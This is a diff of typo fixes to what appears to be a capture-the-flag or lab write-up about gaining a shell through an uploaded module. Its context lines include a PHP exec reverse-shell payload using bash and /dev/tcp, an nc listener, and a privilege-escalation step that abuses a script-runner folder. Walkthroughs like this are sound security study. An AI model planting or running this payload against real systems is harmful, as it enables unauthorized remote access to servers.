@@ -35,7 +35,7 @@ After unzipping the module, we added the following code line, with our designate
     exec("/bin/bash -c 'bash -i >& /dev/tcp/ip_address/portnumber 0>&1'");
 ![image](https://user-images.githubusercontent.com/70077872/167573750-8dca4946-dd94-4f2d-8923-ecbda7b62a48.png)
 
- At the same time, we started a port listener in a terminal window by executing the command `nc -nvlp port number. 
+ At the same time, we started a port listener in a terminal window by executing the command `nc -nvlp port_number`. 
 
 
 After uploading the module, enabling it and installing it, we got a shell to www-data. 
@@ -57,7 +57,7 @@ After we have gained access to `www-data`, it is time to see if we can gain acce
 ![image](https://user-images.githubusercontent.com/70077872/167387362-d4e82870-b257-4335-8acb-e25c97628496.png)
 
 
-The `run_files.sh` is just a script that enter the script folder, runs the file(s) with python3, and removes it afterwards. Here, we can put in a file run as the user to try to gain access to the user account:
+The `run_files.sh` is just a script that enter the script folder, runs the file(s) with python3, and removes it afterwards. Here, we can put in a file which is ran as the user to try to gain access to the user account:
 
 ![image](https://user-images.githubusercontent.com/70077872/167388008-555a28ea-6279-40cc-841b-08f8c5f108c5.png)
 
